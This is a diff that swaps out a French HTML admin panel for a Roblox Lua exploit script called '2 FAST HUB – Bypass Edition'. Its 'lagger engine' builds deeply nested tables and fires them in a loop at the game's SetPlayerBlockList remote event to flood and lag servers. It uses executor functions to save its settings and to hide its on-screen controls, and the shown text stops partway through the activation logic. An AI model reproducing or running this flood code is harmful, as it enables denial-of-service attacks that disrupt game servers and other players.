@@ -1,536 +1,578 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-<meta charset="UTF-8">
-<title> Panel Admin</title>
-<style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-
-  body {
-    font-family: 'Segoe UI', sans-serif;
-    background: radial-gradient(circle at 20% 20%, #1a0b2e 0%, #0a0514 60%, #000 100%);
-    color: #eee;
-    min-height: 100vh;
-    overflow-x: hidden;
-    position: relative;
-  }
-
-  /* Fond animé avec particules violettes */
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background:
-      radial-gradient(2px 2px at 20% 30%, #a855f7, transparent),
-      radial-gradient(2px 2px at 60% 70%, #8b5cf6, transparent),
-      radial-gradient(2px 2px at 80% 20%, #c084fc, transparent),
-      radial-gradient(2px 2px at 40% 80%, #a855f7, transparent);
-    background-size: 300px 300px;
-    animation: drift 20s linear infinite;
-    opacity: 0.4;
-    pointer-events: none;
-    z-index: 0;
-  }
-
-  @keyframes drift {
-    0% { transform: translate(0, 0); }
-    100% { transform: translate(-300px, -300px); }
-  }
-
-  .container {
-    max-width: 1100px;
-    margin: 0 auto;
-    padding: 30px 20px;
-    position: relative;
-    z-index: 1;
-  }
-
-  /* LOGIN */
-  #login-screen {
-    max-width: 420px;
-    margin: 80px auto;
-    background: rgba(20, 10, 40, 0.85);
-    backdrop-filter: blur(20px);
-    border: 1px solid rgba(168, 85, 247, 0.4);
-    border-radius: 20px;
-    padding: 40px 30px;
-    box-shadow:
-      0 0 40px rgba(168, 85, 247, 0.3),
-      inset 0 0 20px rgba(168, 85, 247, 0.05);
-    animation: slideUp 0.6s ease;
-  }
-
-  @keyframes slideUp {
-    from { opacity: 0; transform: translateY(30px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  #login-screen h1 {
-    text-align: center;
-    font-size: 28px;
-    margin-bottom: 25px;
-    background: linear-gradient(90deg, #a855f7, #ec4899);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-  }
-
-  #login-screen input {
-    width: 100%;
-    padding: 14px 16px;
-    margin: 10px 0;
-    background: rgba(30, 15, 60, 0.6);
-    border: 1px solid rgba(168, 85, 247, 0.3);
-    border-radius: 10px;
-    color: #fff;
-    font-size: 15px;
-    outline: none;
-    transition: all 0.3s;
-  }
-
-  #login-screen input:focus {
-    border-color: #a855f7;
-    box-shadow: 0 0 15px rgba(168, 85, 247, 0.4);
-  }
-
-  #login-screen button {
-    width: 100%;
-    padding: 14px;
-    margin-top: 15px;
-    background: linear-gradient(135deg, #8b5cf6, #a855f7);
-    color: #fff;
-    border: none;
-    border-radius: 10px;
-    font-size: 16px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: all 0.3s;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-  }
-
-  #login-screen button:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 10px 30px rgba(168, 85, 247, 0.5);
-  }
-
-  .error { color: #ff4d6d; margin-top: 10px; text-align: center; font-size: 14px; }
-
-  /* PANEL */
-  #panel { display: none; }
-
-  .topbar {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 25px;
-    padding: 15px 25px;
-    background: rgba(20, 10, 40, 0.8);
-    backdrop-filter: blur(15px);
-    border: 1px solid rgba(168, 85, 247, 0.3);
-    border-radius: 15px;
-    animation: slideUp 0.5s ease;
-  }
-
-  .topbar h1 {
-    font-size: 24px;
-    background: linear-gradient(90deg, #a855f7, #ec4899);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-  }
-
-  .topbar h1 span {
-    color: #c084fc;
-    -webkit-text-fill-color: #c084fc;
-    font-weight: bold;
-  }
-
-  .topbar button {
-    background: rgba(239, 68, 68, 0.2);
-    color: #ff6b6b;
-    border: 1px solid rgba(239, 68, 68, 0.4);
-    padding: 8px 18px;
-    border-radius: 8px;
-    cursor: pointer;
-    font-weight: bold;
-    transition: all 0.3s;
-  }
-
-  .topbar button:hover {
-    background: rgba(239, 68, 68, 0.4);
-    transform: translateY(-2px);
-  }
-
-  h2 {
-    font-size: 20px;
-    margin: 30px 0 15px;
-    padding-left: 15px;
-    border-left: 4px solid #a855f7;
-    color: #e9d5ff;
-  }
-
-  /* USERS GRID */
-  .users-grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
-    gap: 15px;
-  }
-
-  .user-card {
-    background: rgba(20, 10, 40, 0.7);
-    backdrop-filter: blur(10px);
-    border: 1px solid rgba(168, 85, 247, 0.25);
-    border-radius: 14px;
-    padding: 18px;
-    transition: all 0.3s;
-    animation: slideUp 0.5s ease;
-  }
-
-  .user-card:hover {
-    transform: translateY(-4px);
-    border-color: #a855f7;
-    box-shadow: 0 10px 30px rgba(168, 85, 247, 0.25);
-  }
-
-  .user-card h3 {
-    color: #c084fc;
-    font-size: 18px;
-    margin-bottom: 5px;
-  }
-
-  .user-card .role {
-    color: #a78bfa;
-    font-size: 13px;
-    margin-bottom: 12px;
-    display: inline-block;
-    padding: 3px 10px;
-    background: rgba(139, 92, 246, 0.15);
-    border-radius: 20px;
-  }
-
-  .user-card .actions {
-    display: flex;
-    gap: 6px;
-    flex-wrap: wrap;
-  }
-
-  .user-card button {
-    flex: 1;
-    min-width: 60px;
-    padding: 8px 6px;
-    border: none;
-    border-radius: 8px;
-    font-size: 12px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: all 0.25s;
-    color: #fff;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-
-  .user-card button:active { transform: scale(0.95); }
-
-  .btn-lag    { background: linear-gradient(135deg, #ef4444, #dc2626); }
-  .btn-lag:hover    { box-shadow: 0 0 15px rgba(239, 68, 68, 0.6); }
-  .btn-warn   { background: linear-gradient(135deg, #f59e0b, #d97706); }
-  .btn-warn:hover   { box-shadow: 0 0 15px rgba(245, 158, 11, 0.6); }
-  .btn-msg    { background: linear-gradient(135deg, #06b6d4, #0891b2); }
-  .btn-msg:hover    { box-shadow: 0 0 15px rgba(6, 182, 212, 0.6); }
-  .btn-kick   { background: linear-gradient(135deg, #8b5cf6, #7c3aed); }
-  .btn-kick:hover   { box-shadow: 0 0 15px rgba(139, 92, 246, 0.6); }
-  .btn-ban    { background: linear-gradient(135deg, #1f2937, #111827); border: 1px solid #ef4444; }
-  .btn-ban:hover    { background: #ef4444; box-shadow: 0 0 15px rgba(239, 68, 68, 0.6); }
-
-  /* LOGS TABLE */
-  .logs-controls {
-    display: flex;
-    gap: 10px;
-    margin-bottom: 15px;
-  }
-
-  .logs-controls button {
-    padding: 10px 18px;
-    border: none;
-    border-radius: 10px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: all 0.3s;
-    color: #fff;
-  }
-
-  .logs-controls .btn-clear {
-    background: linear-gradient(135deg, #ef4444, #dc2626);
-  }
-  .logs-controls .btn-refresh {
-    background: linear-gradient(135deg, #8b5cf6, #a855f7);
-  }
-  .logs-controls button:hover {
-    transform: translateY(-2px);
-    box-shadow: 0 8px 20px rgba(168, 85, 247, 0.4);
-  }
-
-  .table-wrap {
-    background: rgba(20, 10, 40, 0.7);
-    backdrop-filter: blur(10px);
-    border: 1px solid rgba(168, 85, 247, 0.25);
-    border-radius: 14px;
-    overflow: hidden;
-  }
-
-  table { width: 100%; border-collapse: collapse; }
-
-  th, td {
-    padding: 14px 16px;
-    text-align: left;
-    border-bottom: 1px solid rgba(168, 85, 247, 0.15);
-  }
-
-  th {
-    background: rgba(139, 92, 246, 0.2);
-    color: #c084fc;
-    font-size: 13px;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-  }
-
-  tr { transition: background 0.2s; }
-  tr:hover { background: rgba(168, 85, 247, 0.08); }
-
-  .action-badge {
-    display: inline-block;
-    padding: 4px 10px;
-    border-radius: 20px;
-    font-size: 11px;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-
-  .action-lag  { background: rgba(239, 68, 68, 0.25); color: #ff6b6b; border: 1px solid rgba(239, 68, 68, 0.4); }
-  .action-kick { background: rgba(139, 92, 246, 0.25); color: #c084fc; border: 1px solid rgba(139, 92, 246, 0.4); }
-  .action-ban  { background: rgba(31, 41, 55, 0.6); color: #ff4d6d; border: 1px solid rgba(239, 68, 68, 0.4); }
-  .action-warn { background: rgba(245, 158, 11, 0.25); color: #fbbf24; border: 1px solid rgba(245, 158, 11, 0.4); }
-  .action-msg  { background: rgba(6, 182, 212, 0.25); color: #22d3ee; border: 1px solid rgba(6, 182, 212, 0.4); }
-
-  .target-name {
-    color: #c084fc;
-    font-weight: bold;
-  }
-
-  .admin-name {
-    color: #e9d5ff;
-    font-weight: 600;
-  }
-
-  .timestamp {
-    color: #a78bfa;
-    font-size: 13px;
-  }
-
-  /* Toast notification */
-  .toast {
-    position: fixed;
-    bottom: 30px;
-    right: 30px;
-    background: rgba(20, 10, 40, 0.95);
-    backdrop-filter: blur(15px);
-    border: 1px solid #a855f7;
-    border-radius: 12px;
-    padding: 15px 20px;
-    color: #fff;
-    box-shadow: 0 10px 40px rgba(168, 85, 247, 0.4);
-    animation: toastIn 0.4s ease, toastOut 0.4s ease 2.6s forwards;
-    z-index: 1000;
-    max-width: 320px;
-  }
-
-  @keyframes toastIn {
-    from { opacity: 0; transform: translateX(100px); }
-    to { opacity: 1; transform: translateX(0); }
-  }
-  @keyframes toastOut {
-    to { opacity: 0; transform: translateX(100px); }
-  }
-
-  .toast .toast-title {
-    color: #c084fc;
-    font-weight: bold;
-    margin-bottom: 4px;
-  }
-
-  .toast .toast-msg {
-    font-size: 13px;
-    color: #e9d5ff;
-  }
-
-  /* Scrollbar */
-  ::-webkit-scrollbar { width: 8px; }
-  ::-webkit-scrollbar-track { background: #0a0514; }
-  ::-webkit-scrollbar-thumb { background: #8b5cf6; border-radius: 4px; }
-</style>
-</head>
-<body>
-<div class="container">
-
-  <!-- LOGIN -->
-  <div id="login-screen">
-    <h1>🔐 Connexion Admin</h1>
-    <input type="text" id="admin-name" placeholder="👤 Votre nom d'admin">
-    <input type="password" id="admin-password" placeholder="🔑 Mot de passe">
-    <button onclick="login()">⚡ Se connecter</button>
-    <div id="login-error" class="error"></div>
-  </div>
-
-  <!-- PANEL -->
-  <div id="panel">
-    <div class="topbar">
-      <h1> Panel Admin — <span id="current-admin"></span></h1>
-      <button onclick="logout()">🚪 Déconnexion</button>
-    </div>
-
-    <h2>👥 Utilisateurs du panel</h2>
-    <div id="users-grid" class="users-grid"></div>
-
-    <h2>📋 Logs des actions</h2>
-    <div class="logs-controls">
-      <button class="btn-clear" onclick="clearLogs()">🗑️ Effacer les logs</button>
-      <button class="btn-refresh" onclick="loadLogs()">🔄 Rafraîchir</button>
-    </div>
-    <div class="table-wrap">
-      <table>
-        <thead>
-          <tr>
-            <th>#</th>
-            <th>Date / Heure</th>
-            <th>Admin</th>
-            <th>Action</th>
-            <th>Cible</th>
-          </tr>
-        </thead>
-        <tbody id="logs-body"></tbody>
-      </table>
-    </div>
-  </div>
-</div>
-
-<script>
-  let currentAdmin = '';
-
-  async function login() {
-    const name = document.getElementById('admin-name').value.trim();
-    const password = document.getElementById('admin-password').value;
-    const err = document.getElementById('login-error');
-    err.textContent = '';
-    if (!name) { err.textContent = '⚠️ Entrez votre nom.'; return; }
-    try {
-      const res = await fetch('/api/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password, adminName: name })
-      });
-      const data = await res.json();
-      if (data.success) {
-        currentAdmin = data.admin;
-        document.getElementById('current-admin').textContent = currentAdmin;
-        document.getElementById('login-screen').style.display = 'none';
-        document.getElementById('panel').style.display = 'block';
-        loadUsers();
-        loadLogs();
-      } else {
-        err.textContent = '❌ ' + (data.message || 'Échec');
-      }
-    } catch (e) { err.textContent = ' Erreur serveur'; }
-  }
-
-  function logout() {
-    currentAdmin = '';
-    document.getElementById('panel').style.display = 'none';
-    document.getElementById('login-screen').style.display = 'block';
-    document.getElementById('admin-password').value = '';
-  }
-
-  async function loadUsers() {
-    const res = await fetch('/api/users');
-    const users = await res.json();
-    const grid = document.getElementById('users-grid');
-    grid.innerHTML = '';
-    users.forEach((u, i) => {
-      const card = document.createElement('div');
-      card.className = 'user-card';
-      card.style.animationDelay = (i * 0.08) + 's';
-      card.innerHTML = `
-        <h3>${u.name}</h3>
-        <span class="role">${u.role}</span>
-        <div class="actions">
-          <button class="btn-lag"  onclick="doAction('${u.name}','lag')">⚡ Lag</button>
-          <button class="btn-warn" onclick="doAction('${u.name}','warn')">⚠️ Warn</button>
-          <button class="btn-msg"  onclick="doAction('${u.name}','msg')">💬 Msg</button>
-          <button class="btn-kick" onclick="doAction('${u.name}','kick')">👢 Kick</button>
-          <button class="btn-ban"  onclick="doAction('${u.name}','ban')">🚫 Ban</button>
-        </div>
-      `;
-      grid.appendChild(card);
-    });
-  }
-
-  async function doAction(target, action) {
-    try {
-      await fetch('/api/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ admin: currentAdmin, action, target })
-      });
-      showToast(`✅ ${currentAdmin} a fait <b>${action.toUpperCase()}</b> sur <b>${target}</b>`);
-      loadLogs();
-    } catch (e) { console.error(e); }
-  }
-
-  async function loadLogs() {
-    const res = await fetch('/api/logs');
-    const data = await res.json();
-    const tbody = document.getElementById('logs-body');
-    tbody.innerHTML = '';
-    if (data.length === 0) {
-      tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#a78bfa;padding:30px;">Aucun log pour le moment</td></tr>';
-      return;
-    }
-    data.forEach(l => {
-      const tr = document.createElement('tr');
-      const date = new Date(l.timestamp).toLocaleString('fr-FR');
-      tr.innerHTML = `
-        <td style="color:#a78bfa;">#${l.id}</td>
-        <td class="timestamp">${date}</td>
-        <td class="admin-name">${l.admin}</td>
-        <td><span class="action-badge action-${l.action}">${l.action}</span></td>
-        <td class="target-name">🎯 ${l.target}</td>
-      `;
-      tbody.appendChild(tr);
-    });
-  }
-
-  async function clearLogs() {
-    if (!confirm('🗑️ Effacer tous les logs ?')) return;
-    await fetch('/api/logs', { method: 'DELETE' });
-    loadLogs();
-    showToast('️ Logs effacés');
-  }
-
-  function showToast(msg) {
-    const existing = document.querySelector('.toast');
-    if (existing) existing.remove();
-    const toast = document.createElement('div');
-    toast.className = 'toast';
-    toast.innerHTML = `<div class="toast-title">📋 Action enregistrée</div><div class="toast-msg">${msg}</div>`;
-    document.body.appendChild(toast);
-    setTimeout(() => toast.remove(), 3000);
-  }
-
-  // Enter pour se connecter
-  document.getElementById('admin-password').addEventListener('keypress', e => {
-    if (e.key === 'Enter') login();
-  });
-</script>
-</body>
-</html>
+--// 2 FAST HUB – Bypass Edition (Final: power down, BYPASS glow, keybind fix, save)  
+--// Fully working flood engine
+local Players = game:GetService("Players")  
+local UserInputService = game:GetService("UserInputService")  
+local RunService = game:GetService("RunService")  
+local TweenService = game:GetService("TweenService")  
+local HttpService = game:GetService("HttpService")  
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+--==================================================  
+-- CONFIG (save keybind & power)  
+--==================================================
+local CONFIG_FILE = "TwoFastHubBypassConfig.json"
+local function SaveConfig(key, power, platform)  
+local data = {  
+Keybind = key.Name,  
+Power = power,  
+Platform = platform or "PC"  
+}  
+pcall(function()  
+writefile(CONFIG_FILE, HttpService:JSONEncode(data))  
+end)  
+end
+local function LoadConfig()  
+local exists = false  
+pcall(function() exists = isfile(CONFIG_FILE) end)  
+if not exists then return nil end  
+local data = nil  
+pcall(function()  
+data = HttpService:JSONDecode(readfile(CONFIG_FILE))  
+end)  
+return data  
+end
+--==================================================  
+-- LAGGER ENGINE  
+--==================================================
+local DEPTH      = 296  
+local SPAM_DELAY = 0.12  
+local running    = false  
+local bomb       = nil  
+local spamThread = nil
+local function buildBomb(power)  
+local maintable   = {}  
+local spammedtable = {}  
+table.insert(spammedtable, {})  
+local z = spammedtable[1]  
+for i = 1, DEPTH do  
+local tableins = {}  
+table.insert(z, tableins)  
+z = tableins  
+end  
+local maxRep = math.floor(power / (DEPTH + 2))  
+for i = 1, maxRep do  
+table.insert(maintable, spammedtable)  
+end  
+return maintable  
+end
+local function stopBypass()  
+running = false  
+if spamThread then task.cancel(spamThread) end  
+bomb       = nil  
+spamThread = nil  
+end
+local function startBypass(power)  
+stopBypass()  
+running = true  
+bomb = buildBomb(power)  
+spamThread = task.spawn(function()  
+while running do  
+if bomb then  
+pcall(function()  
+game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)  
+end)  
+end  
+task.wait(SPAM_DELAY)  
+end  
+end)  
+end
+--==================================================  
+-- GUI HELPERS  
+--==================================================
+local function getGuiParent()  
+if typeof(gethui) == "function" then  
+local ok, result = pcall(gethui)  
+if ok and result then return result end  
+end  
+local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)  
+if ok and coreGui then return coreGui end  
+return LocalPlayer:WaitForChild("PlayerGui")  
+end
+local function new(className, props, parent)  
+local obj = Instance.new(className)  
+for k, v in pairs(props or {}) do obj[k] = v end  
+obj.Parent = parent  
+return obj  
+end
+local function corner(obj, radius)  
+return new("UICorner", {CornerRadius = UDim.new(0, radius)}, obj)  
+end
+local function stroke(obj, color, thickness, transparency)  
+return new("UIStroke", {  
+Color            = color,  
+Thickness        = thickness or 1,  
+Transparency     = transparency or 0,  
+ApplyStrokeMode  = Enum.ApplyStrokeMode.Border,  
+}, obj)  
+end
+--==================================================  
+-- COLOR SCHEME (blue)  
+--==================================================
+local C = {  
+Bg        = Color3.fromRGB(5, 5, 8),  
+Card      = Color3.fromRGB(10, 10, 14),  
+Card2     = Color3.fromRGB(16, 18, 24),  
+White     = Color3.fromRGB(255, 255, 255),  
+LightText = Color3.fromRGB(225, 230, 240),  
+DimText   = Color3.fromRGB(150, 155, 165),  
+Blue      = Color3.fromRGB(35, 130, 255),  
+BrightBlue= Color3.fromRGB(80, 170, 255),  
+DarkBlue  = Color3.fromRGB(15, 55, 110),  
+Off       = Color3.fromRGB(15, 15, 20),  
+On        = Color3.fromRGB(20, 100, 200),  
+}
+--==================================================  
+-- CREATE GUI  
+--==================================================
+local parent = getGuiParent()  
+local old = parent:FindFirstChild("TwoFastHubBypassGui")  
+if old then old:Destroy() end
+local gui = new("ScreenGui", {  
+Name            = "TwoFastHubBypassGui",  
+ResetOnSpawn    = false,  
+IgnoreGuiInset  = true,  
+ZIndexBehavior  = Enum.ZIndexBehavior.Sibling,  
+}, nil)
+if type(syn) == "table" and type(syn.protect_gui) == "function" then  
+pcall(syn.protect_gui, gui)  
+elseif typeof(protectgui) == "function" then  
+pcall(protectgui, gui)  
+end  
+pcall(function() gui.Parent = parent end)  
+if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+--==================================================  
+-- MAIN FRAME (230×150)  
+--==================================================
+local main = new("Frame", {  
+Name              = "MainFrame",  
+Size              = UDim2.fromOffset(230, 150),  
+Position          = UDim2.new(0.5, -115, 0.5, -75),  
+BackgroundColor3  = C.Bg,  
+BorderSizePixel   = 0,  
+ClipsDescendants  = true,  
+Active            = true,  
+}, gui)  
+corner(main, 10)  
+stroke(main, C.Blue, 1.2)
+local photoHolder = new("Frame", {  
+Size              = UDim2.new(1, -6, 1, -37),  
+Position          = UDim2.fromOffset(3, 34),  
+BackgroundTransparency = 1,  
+BorderSizePixel   = 0,  
+ClipsDescendants  = true,  
+ZIndex            = 1,  
+}, main)  
+corner(photoHolder, 8)
+new("ImageLabel", {  
+Size              = UDim2.fromScale(1, 1),  
+BackgroundTransparency = 1,  
+Image             = "rbxassetid://115568637317716",  
+ScaleType         = Enum.ScaleType.Crop,  
+ImageTransparency = 0.22,  
+ZIndex            = 1,  
+}, photoHolder)
+new("Frame", {  
+Size              = UDim2.fromScale(1, 1),  
+BackgroundColor3  = C.Bg,  
+BackgroundTransparency = 0.7,  
+BorderSizePixel   = 0,  
+ZIndex            = 2,  
+}, photoHolder)
+--==================================================  
+-- HEADER (title + divider + glowing "BYPASS")  
+--==================================================
+local header = new("Frame", {  
+Size              = UDim2.new(1, -6, 0, 38),  
+Position          = UDim2.fromOffset(3, 3),  
+BackgroundColor3  = C.Card,  
+BorderSizePixel   = 0,  
+ClipsDescendants  = true,  
+ZIndex            = 4,  
+}, main)  
+corner(header, 8)
+local titleLabel = new("TextLabel", {  
+Size              = UDim2.new(1, 0, 0, 22),  
+Position          = UDim2.fromOffset(0, 0),  
+BackgroundTransparency = 1,  
+Text              = "2 FAST HUB",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamBlack,  
+TextSize          = 17,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+ZIndex            = 6,  
+}, header)
+task.spawn(function()  
+while titleLabel and titleLabel.Parent do  
+TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {  
+TextColor3 = C.BrightBlue  
+}):Play()  
+task.wait(0.6)  
+TweenService:Create(titleLabel, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {  
+TextColor3 = C.White  
+}):Play()  
+task.wait(0.7)  
+end  
+end)
+new("Frame", {  
+Size              = UDim2.new(1, -16, 0, 1),  
+Position          = UDim2.fromOffset(8, 24),  
+BackgroundColor3  = C.BrightBlue,  
+BackgroundTransparency = 0.2,  
+BorderSizePixel   = 0,  
+ZIndex            = 6,  
+}, header)
+-- Glowing "BYPASS" subtitle  
+local bypassLabel = new("TextLabel", {  
+Size              = UDim2.new(1, 0, 0, 14),  
+Position          = UDim2.fromOffset(0, 26),  
+BackgroundTransparency = 1,  
+Text              = "BYPASS",  
+TextColor3        = C.LightText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 9,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+ZIndex            = 6,  
+}, header)
+-- Make BYPASS glow  
+task.spawn(function()  
+while bypassLabel and bypassLabel.Parent do  
+TweenService:Create(bypassLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {  
+TextColor3 = C.BrightBlue,  
+TextSize = 10  
+}):Play()  
+task.wait(0.5)  
+TweenService:Create(bypassLabel, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {  
+TextColor3 = C.LightText,  
+TextSize = 9  
+}):Play()  
+task.wait(0.5)  
+end  
+end)
+--==================================================  
+-- POWER INPUT FIELD (Y=45)  
+--==================================================
+local powerInput = new("TextBox", {  
+Size              = UDim2.fromOffset(60, 14),  
+Position          = UDim2.new(0.5, -30, 0, 45),  
+BackgroundColor3  = C.Card2,  
+BorderSizePixel   = 0,  
+ClearTextOnFocus  = false,  
+Text              = "100000",  
+TextColor3        = C.LightText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 10,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+ZIndex            = 5,  
+}, main)  
+corner(powerInput, 4)  
+stroke(powerInput, C.Blue, 1)
+--==================================================  
+-- PLATFORM BUTTONS (Y=75)  
+--==================================================
+local pcBtn = new("TextButton", {  
+Size              = UDim2.fromOffset(26, 18),  
+Position          = UDim2.fromOffset(12, 75),  
+BackgroundColor3  = C.Card2,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "PC",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamSemibold,  
+TextSize          = 8,  
+ZIndex            = 5,  
+}, main)  
+corner(pcBtn, 4)  
+stroke(pcBtn, C.Blue, 1)
+local mobileBtn = new("TextButton", {  
+Size              = UDim2.fromOffset(26, 18),  
+Position          = UDim2.new(1, -38, 0, 75),  
+BackgroundColor3  = C.Card2,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "MB",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamSemibold,  
+TextSize          = 8,  
+ZIndex            = 5,  
+}, main)  
+corner(mobileBtn, 4)  
+stroke(mobileBtn, C.Blue, 1)
+--==================================================  
+-- POWER / STATUS RECTANGLE (Y=65, height 36)  
+--==================================================
+local ringFrame = new("Frame", {  
+Size              = UDim2.fromOffset(104, 36),  
+AnchorPoint       = Vector2.new(0.5, 0),  
+Position          = UDim2.new(0.5, 0, 0, 65),  
+BackgroundTransparency = 1,  
+ZIndex            = 3,  
+}, main)  
+corner(ringFrame, 8)  
+local ringStroke = stroke(ringFrame, C.Blue, 2.5)  
+ringStroke.LineJoinMode = Enum.LineJoinMode.Round
+local ringGradient = new("UIGradient", {  
+Rotation = 0,  
+Color = ColorSequence.new({  
+ColorSequenceKeypoint.new(0.00, C.DarkBlue),  
+ColorSequenceKeypoint.new(0.38, C.Blue),  
+ColorSequenceKeypoint.new(0.50, C.BrightBlue),  
+ColorSequenceKeypoint.new(0.62, C.Blue),  
+ColorSequenceKeypoint.new(1.00, C.DarkBlue),  
+})  
+}, ringStroke)
+local ringInner = new("Frame", {  
+Size              = UDim2.new(1, -4, 1, -4),  
+Position          = UDim2.new(0, 2, 0, 2),  
+BackgroundColor3  = C.Bg,  
+BorderSizePixel   = 0,  
+ZIndex            = 4,  
+}, ringFrame)  
+corner(ringInner, 6)
+local statusLabel = new("TextLabel", {  
+Size              = UDim2.fromOffset(28, 36),  
+Position          = UDim2.fromOffset(4, 0),  
+BackgroundTransparency = 1,  
+Text              = "OFF",  
+TextColor3        = C.DimText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 7,  
+TextXAlignment    = Enum.TextXAlignment.Left,  
+TextYAlignment    = Enum.TextYAlignment.Center,  
+ZIndex            = 5,  
+}, ringInner)
+local powerText = new("TextLabel", {  
+Size              = UDim2.new(1, -34, 1, 0),  
+Position          = UDim2.fromOffset(28, 0),  
+BackgroundTransparency = 1,  
+Text              = "100K",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamBlack,  
+TextSize          = 18,  
+TextXAlignment    = Enum.TextXAlignment.Center,  
+TextYAlignment    = Enum.TextYAlignment.Center,  
+ZIndex            = 5,  
+}, ringInner)
+--==================================================  
+-- KEYBIND ROW (Y=105)  
+--==================================================
+new("TextLabel", {  
+Size              = UDim2.fromOffset(50, 14),  
+Position          = UDim2.fromOffset(14, 105),  
+BackgroundTransparency = 1,  
+Text              = "KEYBIND",  
+TextColor3        = C.DimText,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 7,  
+TextXAlignment    = Enum.TextXAlignment.Left,  
+TextYAlignment    = Enum.TextYAlignment.Center,  
+ZIndex            = 5,  
+}, main)
+local kbButton = new("TextButton", {  
+Size              = UDim2.fromOffset(36, 14),  
+Position          = UDim2.new(1, -48, 0, 105),  
+BackgroundColor3  = C.Card,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "[V]",  
+TextColor3        = C.White,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 6,  
+ZIndex            = 6,  
+}, main)  
+corner(kbButton, 3)  
+stroke(kbButton, C.Blue, 0.8)
+--==================================================  
+-- ACTIVATE BUTTON (Y=125)  
+--==================================================
+local activateButton = new("TextButton", {  
+Size              = UDim2.new(1, -16, 0, 18),  
+Position          = UDim2.fromOffset(8, 125),  
+BackgroundColor3  = C.Card,  
+BorderSizePixel   = 0,  
+AutoButtonColor   = false,  
+Text              = "ACTIVATE",  
+TextColor3        = C.Blue,  
+Font              = Enum.Font.GothamBold,  
+TextSize          = 8,  
+ZIndex            = 5,  
+}, main)  
+corner(activateButton, 5)  
+stroke(activateButton, C.Blue, 0.5)
+--==================================================  
+-- STATE & LOGIC  
+--==================================================
+local active           = false  
+local boundKey         = Enum.KeyCode.V  
+local selectedPlatform = "PC"  
+local defaultPowers    = { PC = 100000, MOBILE = 65000 }  
+local currentPower     = defaultPowers.PC  
+local waitingForKey    = false   -- <-- MUST be declared BEFORE it's used
+-- Load saved config  
+local saved = LoadConfig()  
+if saved then  
+local key = Enum.KeyCode[saved.Keybind]  
+if key then boundKey = key end  
+if saved.Power and saved.Power > 0 then  
+currentPower = math.floor(saved.Power)  
+end  
+if saved.Platform == "PC" or saved.Platform == "MOBILE" then  
+selectedPlatform = saved.Platform  
+end  
+end
+local function formatPower(num)  
+if num >= 1000 then  
+return string.format("%dK", math.floor(num / 1000 + 0.5))  
+end  
+return tostring(num)  
+end
+local function updatePowerDisplay()  
+powerText.Text = formatPower(currentPower)  
+powerInput.Text = tostring(currentPower)  
+end
+local function highlightPlatform(platform)  
+pcBtn.BackgroundColor3 = C.Card2  
+mobileBtn.BackgroundColor3 = C.Card2  
+pcBtn.TextColor3 = C.White  
+mobileBtn.TextColor3 = C.White  
+if platform == "PC" then  
+pcBtn.BackgroundColor3 = C.Blue  
+pcBtn.TextColor3 = C.White  
+else  
+mobileBtn.BackgroundColor3 = C.Blue  
+mobileBtn.TextColor3 = C.White  
+end  
+end
+local function setActive(state)  
+active = state  
+if state then  
+statusLabel.Text       = "ON"  
+statusLabel.TextColor3 = C.BrightBlue  
+activateButton.BackgroundColor3 = C.Blue  
+activateButton.TextColor3       = C.White  
+ringStroke.Color = C.BrightBlue  
+ringGradient.Color = ColorSequence.new({  
+ColorSequenceKeypoint.new(0.00, C.Blue),  
+ColorSequenceKeypoint.new(0.38, C.BrightBlue),  
+ColorSequenceKeypoint.new(0.50, Color3.fromRGB(150, 220, 255)),  
+ColorSequenceKeypoint.new(0.62, C.BrightBlue),  
+ColorSequenceKeypoint.new(1.00, C.Blue),  
+})  
+startBypass(currentPower)  
+else  
+statusLabel.Text       = "OFF"  
+statusLabel.TextColor3 = C.DimText  
+activateButton.BackgroundColor3 = C.Card  
+activateButton.TextColor3       = C.Blue  
+ringStroke.Color = C.Blue  
+ringGradient.Color = ColorSequence.new({  
+ColorSequenceKeypoint.new(0.00, C.DarkBlue),  
+ColorSequenceKeypoint.new(0.38, C.Blue),  
